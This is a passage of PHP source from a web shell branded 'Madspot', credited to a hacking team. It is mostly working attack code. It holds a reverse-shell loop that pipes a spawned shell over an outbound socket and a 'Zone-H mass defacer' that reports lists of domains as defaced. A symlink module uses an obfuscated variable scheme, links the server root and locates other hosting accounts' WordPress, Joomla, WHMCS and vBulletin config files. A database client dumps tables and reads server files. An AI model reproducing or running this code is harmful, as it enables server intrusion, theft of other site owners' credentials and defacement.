
    umask(0);

    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
            echo "$errstr ($errno)";
            exit(1);
    }


    $descriptorspec = array(
       0 =&gt; array("pipe", "r"),  
       1 =&gt; array("pipe", "w"),  
       2 =&gt; array("pipe", "w")  
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
            echo "ERROR: Can't spawn shell&lt;br&gt;";
            exit(1);
    }


    @stream_set_blocking($pipes[0], 0);
    @stream_set_blocking($pipes[1], 0);
    @stream_set_blocking($pipes[2], 0);
    @stream_set_blocking($sock, 0);

    echo "Successfully opened reverse shell to $ip:$port&lt;br&gt;";

    while (1) {
            if (feof($sock)) {
                    echo "ERROR: Shell connection terminated&lt;br&gt;";
                    break;
            }

            if (feof($pipes[1])) {
                    echo "ERROR: Shell process terminated&lt;br&gt;";
                    break;
            }


            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets=@stream_select($read_a, $write_a, $error_a, null);

            if (in_array($sock, $read_a)) {
                    if ($debug) echo "SOCK READ&lt;br&gt;";
                    $input=fread($sock, $chunk_size);
                    if ($debug) echo "SOCK: $input&lt;br&gt;";
                    fwrite($pipes[0], $input);
            }

            if (in_array($pipes[1], $read_a)) {
                    if ($debug) echo "STDOUT READ&lt;br&gt;";
                    $input = fread($pipes[1], $chunk_size);
                    if ($debug) echo "STDOUT: $input&lt;br&gt;";
                    fwrite($sock, $input);
            }


            if (in_array($pipes[2], $read_a)) {
                    if ($debug) echo "STDERR READ&lt;br&gt;";
                    $input = fread($pipes[2], $chunk_size);
                    if ($debug) echo "STDERR: $input&lt;br&gt;";
                    fwrite($sock, $input);
            }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    echo "&lt;/pre&gt;";
    }

    }  
     echo "&lt;/div&gt;";
     madfooter();
    }
    function ZoneH($url, $hacker, $hackmode,$reson, $site )
    {
            $k = curl_init();
            curl_setopt($k, CURLOPT_URL, $url);
            curl_setopt($k,CURLOPT_POST,true);
            curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
            curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
            $kubra = curl_exec($k);
            curl_close($k);
            return $kubra;
    }
    function madzoneh()
    {
        madhead();
        if(!function_exists('curl_version'))
        {
            echo "&lt;pre class=ml1 style='margin-top:5px'&gt;&lt;center&gt;&lt;font color=red&gt;PHP CURL NOT EXIT&lt;/font&gt;&lt;/center&gt;&lt;/pre&gt;";
        }
        echo "&lt;div class=header&gt;&lt;center&gt;&lt;br&gt;";
        echo '&lt;h3&gt;&lt;span&gt;|ZONE-H MASS DEFACER |&lt;/span&gt;&lt;/h3&gt;
       &lt;form  onSubmit="g(null,null,this.defacer.value,this.hackmode.value,this.domain.value);return false;" &gt;
       &lt;span&gt;| Notifier |&lt;/span&gt;&lt;br&gt;
    &lt;input type="text" name=defacer size="40" value="Attacker" /&gt;&lt;br&gt;
    &lt;select name=hackmode&gt;
    &lt;option &gt;--------SELECT--------&lt;/option&gt;
    &lt;option value="1"&gt;known vulnerability (i.e. unpatched system)&lt;/option&gt;
    &lt;option value="2" &gt;undisclosed (new) vulnerability&lt;/option&gt;
    &lt;option value="3" &gt;configuration / admin. mistake&lt;/option&gt;
    &lt;option value="4" &gt;brute force attack&lt;/option&gt;
    &lt;option value="5" &gt;social engineering&lt;/option&gt;
    &lt;option value="6" &gt;Web Server intrusion&lt;/option&gt;
    &lt;option value="7" &gt;Web Server external module intrusion&lt;/option&gt;
    &lt;option value="8" &gt;Mail Server intrusion&lt;/option&gt;
    &lt;option value="9" &gt;FTP Server intrusion&lt;/option&gt;
    &lt;option value="10" &gt;SSH Server intrusion&lt;/option&gt;
    &lt;option value="11" &gt;Telnet Server intrusion&lt;/option&gt;
    &lt;option value="12" &gt;RPC Server intrusion&lt;/option&gt;
    &lt;option value="13" &gt;Shares misconfiguration&lt;/option&gt;
    &lt;option value="14" &gt;Other Server intrusion&lt;/option&gt;
    &lt;option value="15" &gt;SQL Injection&lt;/option&gt;
    &lt;option value="16" &gt;URL Poisoning&lt;/option&gt;
    &lt;option value="17" &gt;File Inclusion&lt;/option&gt;
    &lt;option value="18" &gt;Other Web Application bug&lt;/option&gt;
    &lt;option value="19" &gt;Remote administrative panel access bruteforcing&lt;/option&gt;
    &lt;option value="20" &gt;Remote administrative panel access password guessing&lt;/option&gt;
    &lt;option value="21" &gt;Remote administrative panel access social engineering&lt;/option&gt;
    &lt;option value="22" &gt;Attack against administrator(password stealing/sniffing)&lt;/option&gt;
    &lt;option value="23" &gt;Access credentials through Man In the Middle attack&lt;/option&gt;
    &lt;option value="24" &gt;Remote service password guessing&lt;/option&gt;
    &lt;option value="25" &gt;Remote service password bruteforce&lt;/option&gt;
    &lt;option value="26" &gt;Rerouting after attacking the Firewall&lt;/option&gt;
    &lt;option value="27" &gt;Rerouting after attacking the Router&lt;/option&gt;
    &lt;option value="28" &gt;DNS attack through social engineering&lt;/option&gt;
    &lt;option value="29" &gt;DNS attack through cache poisoning&lt;/option&gt;
    &lt;option value="30" &gt;Not available&lt;/option&gt;
    &lt;/select&gt;&lt;br&gt;
    &lt;select  &gt;
    &lt;option &gt;Not available&lt;/option&gt;
    &lt;option value="1" &gt;Heh...just for fun!&lt;/option&gt;
    &lt;option value="2" &gt;Revenge against that website&lt;/option&gt;
    &lt;option value="3" &gt;Political reasons&lt;/option&gt;
    &lt;option value="4" &gt;As a challenge&lt;/option&gt;
    &lt;option value="5" &gt;I just want to be the best defacer&lt;/option&gt;
    &lt;option value="6" &gt;Patriotism&lt;/option&gt;
    &lt;option value="7" &gt;Not available&lt;/option&gt;
    &lt;/select&gt;&lt;br&gt;
    &lt;textarea name=domain cols="50" rows="15"&gt;List Of Domains&lt;/textarea&gt;
    &lt;br&gt;
    &lt;input type="submit" value="&gt;&gt;" /&gt;&lt;/form&gt;';
    if(isset($_POST['p1']) && isset($_POST['p2']))
    {
        $hacker =$_POST['p1'];
        $method =$_POST['p2'];
        $neden ="Not available";
        $site =$_POST['p3'];
       $i = 0;
       $sites = explode("\n", $site);
       echo "&lt;pre class=ml1 style='margin-top:5px'&gt;";
            while($i &lt; count($sites))
            {
            if(substr($sites[$i], 0, 4) != "http")
            {
                            $sites[$i] = "http://".$sites[$i];
            }
            ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
            echo "Site : ".$sites[$i]." Defaced !&lt;br&gt;";
            ++$i;
            }

        "Sending Sites To Zone-H Has Been Completed Successfully !! &lt;/pre&gt;";
    }
    echo "&lt;/div&gt;";
    madfooter();

    }
    function madspot()
    {
        madhead();
        echo "&lt;div class=header&gt;";
        echo "&lt;pre&gt;

                              |`-:_
     ,----....____            |    `+.
    (             ````----....|___   |
     \     _                      ````----....____
      \    _)  Coded By: Ikram Ali                ```---.._
       \                                                   \
     )`.\  )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )hh
    -'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `
      Madspot is a Team of professional Ethical Hackers From Pakistan.
      We have Years of  Experience in  Security, Penetration & Coding
      And can Break and Secure.

      Version 1.0

      Contact : http://www.madspot.net

      if you found bug contact our team




                 .=''=.
                / _  _ \
               |  d  b  |
               \   /\   /
              ,/'-=\/=-'\,
             / /        \ \     -----------------------------
            | / Zahid    \ |    Madspot Digital Security Team
            \/ \ Rasheed/ \/    -----------------------------
                '.    .'
                _|`~~`|_
                /|\  /|\

          .- &lt;O&gt; -.        .-====-.      ,-------.      .-=&lt;&gt;=-.
      /_-\'''/-_\      / / '' \ \     |,-----.|     /__----__\
     |/  o) (o  \|    | | ')(' | |   /,'-----'.\   |/ (')(') \|
      \   ._.   /      \ \    / /   {_/(') (')\_}   \   __   /
      ,&gt;-_,,,_-&lt;.       &gt;'=jf='&lt;     `.   _   .'    ,'--__--'.
    / Waqar.Khan  \    /        \     /'-___-'\    /    <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_neutral.gif" alt=":|" class="wp-smiley" />    \
    (_)     .     (_)  /  Ikram   \   / M-Usman \  (_)   <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_neutral.gif" alt=":|" class="wp-smiley" />   (_)
    \_-----'____--/  (_)  Ali   (_) (_)_______(_)   |___:|____|
     \___________/     |________|     \_______/     | Afrasiab|





       &lt;/pre&gt;&lt;/div&gt;";
        madfooter();

        }

    function madsymlink()
    {
        madhead();

    $IIIIIIIIIIIl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
    $IIIIIIIIIII1=explode('/',$IIIIIIIIIIIl );
    $IIIIIIIIIIIl =str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1)-1],'',$IIIIIIIIIIIl );  




       echo '&lt;div class=header&gt;&lt;script&gt;p1_=p2_=p3_="";&lt;/script&gt;&lt;br&gt;&lt;center&gt;&lt;h3&gt;&lt;a href=# onclick="g(\'symlink\',null,\'website\',null)"&gt;| Domains | &lt;/a&gt;&lt;a href=# onclick="g(\'symlink\',null,null,\'whole\')"&gt;| Whole Server Symlink | &lt;/a&gt;&lt;a href=# onclick="g(\'symlink\',null,null,null,\'config\')"&gt;| Config PHP symlink | &lt;/a&gt;&lt;/h3&gt;&lt;/center&gt;';

        if(isset($_POST['p1']) && $_POST['p1']=='website')
        {
            echo "&lt;center&gt;";
            $d0mains = @file("/etc/named.conf");
            if(!$d0mains){ echo "&lt;pre class=ml1 style='margin-top:5px'&gt;Cant access this file on server -&gt; [ /etc/named.conf ]&lt;/pre&gt;&lt;/center&gt;"; }



    echo "&lt;table align=center class='main'  border=0  &gt;

    &lt;tr bgcolor=Red&gt;&lt;td&gt;Count&lt;/td&gt;&lt;td&gt;domains&lt;/td&gt;&lt;td&gt;users&lt;/td&gt;&lt;/tr&gt;";
    $count=1;
    foreach($d0mains as $d0main){

    if(@eregi("zone",$d0main)){

    preg_match_all('#zone "(.*)"#', $d0main, $domains);

    flush();

    if(strlen(trim($domains[1][0])) &gt; 2){

    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

    echo "&lt;tr&gt;&lt;td&gt;".$count."&lt;/td&gt;&lt;td&gt;&lt;a href=http://www.".$domains[1][0]."/&gt;".$domains[1][0]."&lt;/a&gt;&lt;/td&gt;&lt;td&gt;".$user['name']."&lt;/td&gt;&lt;/tr&gt;"; flush();
    $count++;
    }}}
    echo "&lt;/center&gt;&lt;/table&gt;";
     }

     if(isset($_POST['p2']) && $_POST['p2']=='whole')
     {


        @set_time_limit(0);

        echo "&lt;center&gt;";



    @mkdir('sym',0777);
    $IIIIIIIIIIl1  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $IIIIIIIIII1I =@fopen ('sym/.htaccess','w');
    fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
    @symlink('/','sym/root');
    $IIIIIIIIIlIl = basename('_FILE_');


    $IIIIIIIIIllI = @file('/etc/named.conf');
    if(!$IIIIIIIIIllI)
    {
    echo "&lt;pre class=ml1 style='margin-top:5px'&gt;# Cant access this file on server -&gt; [ /etc/named.conf ]&lt;/pre&gt;&lt;/center&gt;";
    }
    else
    {
    echo "&lt;table align='center' width='40%' class='main'&gt;&lt;td&gt;Domains&lt;/td&gt;&lt;td&gt;Users&lt;/td&gt;&lt;td&gt;symlink &lt;/td&gt;";
    foreach($IIIIIIIIIllI as $IIIIIIIIIll1){
    if(@eregi('zone',$IIIIIIIIIll1)){
    preg_match_all('#zone "(.*)"#',$IIIIIIIIIll1,$IIIIIIIIIl11);
    flush();
    if(strlen(trim($IIIIIIIIIl11[1][0])) &gt;2){
    $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIIIl11[1][0]));
    $IIIIIIII1I1l = $IIIIIIIII1I1['name'] ;
    @symlink('/','sym/root');
    $IIIIIIII1I1l = $IIIIIIIIIl11[1][0];
    $IIIIIIII1I11 = '\.ir';
    $IIIIIIII1lII = '\.il';
    if (@eregi("$IIIIIIII1I11",$IIIIIIIIIl11[1][0]) or @eregi("$IIIIIIII1lII",$IIIIIIIIIl11[1][0]) )
    {
    $IIIIIIII1I1l = "&lt;div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '&gt;".$IIIIIIIIIl11[1][0].'&lt;/div&gt;';
    }
    echo "
    &lt;tr&gt;

    &lt;td&gt;
    &lt;a target='_blank' href=http://www.".$IIIIIIIIIl11[1][0].'/&gt;'.$IIIIIIII1I1l.' &lt;/a&gt;
    &lt;/td&gt;

    &lt;td&gt;
    '.$IIIIIIIII1I1['name']."
    &lt;/td&gt;

    &lt;td&gt;
    &lt;a href='sym/root/home/".$IIIIIIIII1I1['name']."/public_html' target='_blank'&gt;symlink &lt;/a&gt;
    &lt;/td&gt;


    &lt;/tr&gt;";
    flush();
    }
    }
    }
    }

    echo "&lt;/center&gt;&lt;/table&gt;";

     }



     if(isset($_POST['p3']) && $_POST['p3']=='config')


     {
      echo "&lt;center&gt;";
    @mkdir('sym',0777);
    $IIIIIIIIIIl1  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $IIIIIIIIII1I =@fopen ('sym/.htaccess','w');
    @fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
    @symlink('/','sym/root');
    $IIIIIIIIIlIl = basename('_FILE_');


       $IIIIIIIIIllI = @file('/etc/named.conf');
    if(!$IIIIIIIIIllI)
    {
    echo "&lt;pre class=ml1 style='margin-top:5px'&gt;# Cant access this file on server -&gt; [ /etc/named.conf ]&lt;/pre&gt;&lt;/center&gt;";
    }
    else
    {
    echo "
    &lt;table align='center' width='40%' class='main' &gt;&lt;td&gt; Domains &lt;/td&gt;&lt;td&gt; Script &lt;/td&gt;";
    foreach($IIIIIIIIIllI as $IIIIIIIIIll1){
    if(@eregi('zone',$IIIIIIIIIll1)){
    preg_match_all('#zone "(.*)"#',$IIIIIIIIIll1,$IIIIIIIIIl11);
    flush();
    if(strlen(trim($IIIIIIIIIl11[1][0])) &gt;2){
    $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIIIl11[1][0]));
    $IIIIIIIII1l1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/wp-config.php';
    $IIIIIIIII11I=get_headers($IIIIIIIII1l1);
    $IIIIIIIII11l=$IIIIIIIII11I[0];
    $IIIIIIIII111=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/blog/wp-config.php';
    $IIIIIIIIlIII=get_headers($IIIIIIIII111);
    $IIIIIIIIlIIl=$IIIIIIIIlIII[0];
    $IIIIIIIIlII1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/configuration.php';
    $IIIIIIIIlIlI=get_headers($IIIIIIIIlII1);
    $IIIIIIIIlIll=$IIIIIIIIlIlI[0];
    $IIIIIIIIlIl1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/joomla/configuration.php';
    $IIIIIIIIlI1I=get_headers($IIIIIIIIlIl1);
    $IIIIIIIIlI1l=$IIIIIIIIlI1I[0];
    $IIIIIIIIlI11=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/includes/config.php';
    $IIIIIIIIllII=get_headers($IIIIIIIIlI11);
    $IIIIIIIIllIl=$IIIIIIIIllII[0];
    $IIIIIIIIllI1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/vb/includes/config.php';
    $IIIIIIIIlllI=get_headers($IIIIIIIIllI1);
    $IIIIIIIIllll=$IIIIIIIIlllI[0];
    $IIIIIIIIlll1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/forum/includes/config.php';
    $IIIIIIIIll1I=get_headers($IIIIIIIIlll1);
    $IIIIIIIIll1l=$IIIIIIIIll1I[0];
    $IIIIIIIIll11=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'public_html/clients/configuration.php';
    $IIIIIIIIl1II=get_headers($IIIIIIIIll11);
    $IIIIIIIIl1Il=$IIIIIIIIl1II[0];
    $IIIIIIIIl1I1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/support/configuration.php';
    $IIIIIIIIl1II=get_headers($IIIIIIIIl1I1);
    $IIIIIIIIl1lI=$IIIIIIIIl1II[0];
    $IIIIIIIIl1ll=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/client/configuration.php';
    $IIIIIIIIl1l1=get_headers($IIIIIIIIl1ll);
    $IIIIIIIIl11I=$IIIIIIIIl1l1[0];
    $IIIIIIIIl11l=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/submitticket.php';
    $IIIIIIIIl111=get_headers($IIIIIIIIl11l);
    $IIIIIIII1III=$IIIIIIIIl111[0];
    $IIIIIIII1IIl=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/client/configuration.php';
    $IIIIIIII1II1=get_headers($IIIIIIII1IIl);
    $IIIIIIII1IlI=$IIIIIIII1II1[0];
    $IIIIIIII1Ill = strpos($IIIIIIIII11l,'200');
    $IIIIIIII1I1I='&nbsp;';
    if (strpos($IIIIIIIII11l,'200') == true )
    {
    $IIIIIIII1I1I="&lt;a href='".$IIIIIIIII1l1."' target='_blank'&gt;Wordpress&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIlIIl,'200') == true)
    {
    $IIIIIIII1I1I="&lt;a href='".$IIIIIIIII111."' target='_blank'&gt;Wordpress&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIlIll,'200')  == true and strpos($IIIIIIII1III,'200')  == true )
    {
    $IIIIIIII1I1I=" &lt;a href='".$IIIIIIIIl11l."' target='_blank'&gt;WHMCS&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIl1lI,'200')  == true)
    {
    $IIIIIIII1I1I =" &lt;a href='".$IIIIIIIIl1I1."' target='_blank'&gt;WHMCS&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIl11I,'200')  == true)
    {
    $IIIIIIII1I1I =" &lt;a href='".$IIIIIIIIl1ll."' target='_blank'&gt;WHMCS&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIlIll,'200')  == true)
    {
    $IIIIIIII1I1I=" &lt;a href='".$IIIIIIIIlII1."' target='_blank'&gt;Joomla&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIlI1l,'200')  == true)
    {
    $IIIIIIII1I1I=" &lt;a href='".$IIIIIIIIlIl1."' target='_blank'&gt;Joomla&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIllIl,'200')  == true)
    {
    $IIIIIIII1I1I=" &lt;a href='".$IIIIIIIIlI11."' target='_blank'&gt;vBulletin&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIllll,'200')  == true)
    {
    $IIIIIIII1I1I=" &lt;a href='".$IIIIIIIIllI1."' target='_blank'&gt;vBulletin&lt;/a&gt;";
    }
    elseif (strpos($IIIIIIIIll1l,'200')  == true)
    {
    $IIIIIIII1I1I=" &lt;a href='".$IIIIIIIIlll1."' target='_blank'&gt;vBulletin&lt;/a&gt;";
    }
    else
    {
    continue;
    }
    $IIIIIIII1I1l = $IIIIIIIII1I1['name'] ;
    echo '&lt;tr&gt;&lt;td&gt;&lt;a href=http://www.'.$IIIIIIIIIl11[1][0].'/&gt;'.$IIIIIIIIIl11[1][0].'&lt;/a&gt;&lt;/td&gt;
    &lt;td&gt;'.$IIIIIIII1I1I.'&lt;/td&gt;&lt;/tr&gt;';flush();
    }
    }
    }
    }
    echo "&lt;/center&gt;&lt;/table&gt;";  

     }

        echo "&lt;/div&gt;";
        madfooter();

    }


    function madsql()
    {


        class DbClass {
                    var $type;
                    var $link;
                    var $res;
                    function DbClass($type) {
                            $this-&gt;type = $type;
                    }
                    function connect($host, $user, $pass, $dbname){
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            if( $this-&gt;link = @mysql_connect($host,$user,$pass,true) ) return true;
                                            break;
                                    case 'pgsql':
                                            $host = explode(':', $host);
                                            if(!$host[1]) $host[1]=5432;
                                            if( $this-&gt;link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
                                            break;
                            }
                            return false;
                    }
                    function selectdb($db) {
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            if (@mysql_select_db($db))return true;
                                            break;
                            }
                            return false;
                    }
                    function query($str) {
                            switch($this-&gt;type) {
                                    case 'mysql':
                                            return $this-&gt;res = @mysql_query($str);
                                            break;
                                    case 'pgsql':
                                            return $this-&gt;res = @pg_query($this-&gt;link,$str);
                                            break;
                            }
                            return false;
                    }
                    function fetch() {
                            $res = func_num_args()?func_get_arg(0):$this-&gt;res;
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            return @mysql_fetch_assoc($res);
                                            break;
                                    case 'pgsql':
                                            return @pg_fetch_assoc($res);
                                            break;
                            }
                            return false;
                    }
                    function listDbs() {
                            switch($this-&gt;type)     {
                                    case 'mysql':
                            return $this-&gt;query("SHOW databases");
                                    break;
                                    case 'pgsql':
                                            return $this-&gt;res = $this-&gt;query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
                                    break;
                            }
                            return false;
                    }
                    function listTables() {
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            return $this-&gt;res = $this-&gt;query('SHOW TABLES');
                                    break;
                                    case 'pgsql':
                                            return $this-&gt;res = $this-&gt;query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
                                    break;
                            }
                            return false;
                    }
                    function error() {
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            return @mysql_error();
                                    break;
                                    case 'pgsql':
                                            return @pg_last_error();
                                    break;
                            }
                            return false;
                    }
                    function setCharset($str) {
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            if(function_exists('mysql_set_charset'))
                                                    return @mysql_set_charset($str, $this-&gt;link);
                                            else
                                                    $this-&gt;query('SET CHARSET '.$str);
                                            break;
                                    case 'pgsql':
                                            return @pg_set_client_encoding($this-&gt;link, $str);
                                            break;
                            }
                            return false;
                    }
                    function loadFile($str) {
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            return $this-&gt;fetch($this-&gt;query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
                                    break;
                                    case 'pgsql':
                                            $this-&gt;query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
                                            $r=array();
                                            while($i=$this-&gt;fetch())
                                                    $r[] = $i['file'];
                                            $this-&gt;query('drop table wso2');
                                            return array('file'=&gt;implode("\n",$r));
                                    break;
                            }
                            return false;
                    }
                    function dump($table, $fp = false) {
                            switch($this-&gt;type)     {
                                    case 'mysql':
                                            $res = $this-&gt;query('SHOW CREATE TABLE `'.$table.'`');
                                            $create = mysql_fetch_array($res);
                                            $sql = $create[1].";\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
                                            $this-&gt;query('SELECT * FROM `'.$table.'`');
                        $head = true;
                                            while($item = $this-&gt;fetch()) {
                                                    $columns = array();
                                                    foreach($item as $k=&gt;$v) {
                                if($v == null)
                                    $item[$k] = "NULL";
                                elseif(is_numeric($v))
                                    $item[$k] = $v;
                                else
                                    $item[$k] = "'".@mysql_real_escape_string($v)."'";
                                                            $columns[] = "`".$k."`";
                                                    }
                            if($head) {
                                $sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
                                $head = false;
                            } else
                                $sql = "\n\t,(".implode(", ", $item).')';
                            if($fp) fwrite($fp, $sql); else echo($sql);
                                            }
                        if(!$head)
                            if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
                                    break;
                                    case 'pgsql':
                                            $this-&gt;query('SELECT * FROM '.$table);
                                            while($item = $this-&gt;fetch()) {
                                                    $columns = array();
                                                    foreach($item as $k=&gt;$v) {
                                                            $item[$k] = "'".addslashes($v)."'";
                                                            $columns[] = $k;
                                                    }
                            $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                            if($fp) fwrite($fp, $sql); else echo($sql);
                                            }
                                    break;
                            }
                            return false;
                    }
            };
            $db = new DbClass($_POST['type']);
            if(@$_POST['p2']=='download') {
                    $db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
                    $db-&gt;selectdb($_POST['sql_base']);
            switch($_POST['charset']) {
                case "Windows-1251": $db-&gt;setCharset('cp1251'); break;
                case "UTF-8": $db-&gt;setCharset('utf8'); break;
                case "KOI8-R": $db-&gt;setCharset('koi8r'); break;
                case "KOI8-U": $db-&gt;setCharset('koi8u'); break;
                case "cp866": $db-&gt;setCharset('cp866'); break;
            }
            if(empty($_POST['file'])) {
                ob_start("ob_gzhandler", 4096);
                header("Content-Disposition: attachment; filename=dump.sql");
                header("Content-Type: text/plain");
                foreach($_POST['tbl'] as $v)
                                    $db-&gt;dump($v);
                exit;
            } elseif($fp = @fopen($_POST['file'], 'w')) {
                foreach($_POST['tbl'] as $v)
                    $db-&gt;dump($v, $fp);
                fclose($fp);
                unset($_POST['p2']);
            } else
                die('&lt;script&gt;alert("Error! Can\'t open file");window.history.back(-1)&lt;/script&gt;');
            }
            madhead();
            echo "
    &lt;div class=header&gt;
    &lt;form name='sf' method='post' onsubmit='fs(this);'&gt;&lt;table cellpadding='2' cellspacing='0'&gt;&lt;tr&gt;
    &lt;td&gt;Type&lt;/td&gt;&lt;td&gt;Host&lt;/td&gt;&lt;td&gt;Login&lt;/td&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;Database&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
    &lt;input type=hidden name=a value=Sql&gt;&lt;input type=hidden name=p1 value='query'&gt;&lt;input type=hidden name=p2 value=''&gt;&lt;input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'&gt;&lt;input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'&gt;
    &lt;td&gt;&lt;select name='type'&gt;&lt;option value='mysql' ";
        if(@$_POST['type']=='mysql')echo 'selected';
    echo "&gt;MySql&lt;/option&gt;&lt;option value='pgsql' ";
    if(@$_POST['type']=='pgsql')echo 'selected';
    echo "&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;
    &lt;td&gt;&lt;input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'&gt;&lt;/td&gt;
    &lt;td&gt;&lt;input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'&gt;&lt;/td&gt;
    &lt;td&gt;&lt;input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'&gt;&lt;/td&gt;&lt;td&gt;";
            $tmp = "&lt;input type=text name=sql_base value=''&gt;";
            if(isset($_POST['sql_host'])){
                    if($db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
                            switch($_POST['charset']) {
                                    case "Windows-1251": $db-&gt;setCharset('cp1251'); break;
                                    case "UTF-8": $db-&gt;setCharset('utf8'); break;
                                    case "KOI8-R": $db-&gt;setCharset('koi8r'); break;
                                    case "KOI8-U": $db-&gt;setCharset('koi8u'); break;
                                    case "cp866": $db-&gt;setCharset('cp866'); break;
                            }
                            $db-&gt;listDbs();
                            echo "&lt;select name=sql_base&gt;&lt;option value=''&gt;&lt;/option&gt;";
                            while($item = $db-&gt;fetch()) {
                                    list($key, $value) = each($item);
                                    echo '&lt;option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'&gt;'.$value.'&lt;/option&gt;';
                            }
                            echo '&lt;/select&gt;';
                    }
                    else echo $tmp;
            }else
                    echo $tmp;
            echo "&lt;/td&gt;
                                    &lt;td&gt;&lt;input type=submit value='&gt;&gt;' onclick='fs(d.sf);'&gt;&lt;/td&gt;
                   &lt;td&gt;&lt;input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "&gt; count the number of rows&lt;/td&gt;
                            &lt;/tr&gt;
                    &lt;/table&gt;
                    &lt;script&gt;
               s_db='".@addslashes($_POST['sql_base'])."';
               function fs(f) {
                   if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                       if(f.p1) f.p1.value='';
                       if(f.p2) f.p2.value='';
                       if(f.p3) f.p3.value='';
                   }
               }
                            function st(t,l) {
                                    d.sf.p1.value = 'select';
                                    d.sf.p2.value = t;
                   if(l && d.sf.p3) d.sf.p3.value = l;
                                    d.sf.submit();
                            }
                            function is() {
                                    for(i=0;i&lt;d.sf.elements['tbl[]'].length;++i)
                                            d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
                            }
                    &lt;/script&gt;";
            if(isset($db) && $db-&gt;link){
